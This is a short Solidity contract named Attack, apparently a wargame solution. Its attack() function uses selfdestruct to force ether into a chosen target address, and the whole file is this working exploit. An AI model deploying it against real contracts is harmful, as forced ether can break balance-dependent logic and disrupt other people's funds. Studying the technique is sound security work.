// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Attack {
    address public force;

    constructor(address _force) public {
        force = _force;
    }

    function attack() public payable {
        selfdestruct(payable(address(force)));
    }
}
